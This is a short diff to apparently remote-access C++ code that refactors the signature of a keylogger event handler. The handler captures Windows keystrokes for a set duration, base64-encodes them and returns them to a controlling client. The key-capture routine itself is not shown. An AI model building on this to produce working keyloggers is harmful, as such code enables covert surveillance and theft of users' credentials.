@@ -12,7 +12,7 @@ KeyLogEventHandler::KeyLogEventHandler(unsigned int duration)
 {
 }
 
-std::unique_ptr<IRequest> KeyLogEventHandler::handle(EventType event_type, const std::string& client_id)
+std::unique_ptr<IRequest> KeyLogEventHandler::handle(const EventInfo& event_info, const std::string& client_id)
 {
     const std::string result = windows::log_keys(m_duration);
     const std::string encoded_result = result.length() == 0 ? "" : base64::to_base64(result);
@@ -20,7 +20,7 @@ std::unique_ptr<IRequest> KeyLogEventHandler::handle(EventType event_type, const
     return std::make_unique<ReturnEventProductRequest>(
         RequestHeader{ RequestType::ReturnEventProduct, client_id },
         generated_command_id,
-        event_type,
+        event_info,
         KeyLogProduct(generated_command_id, encoded_result).serialize()
     );
 }
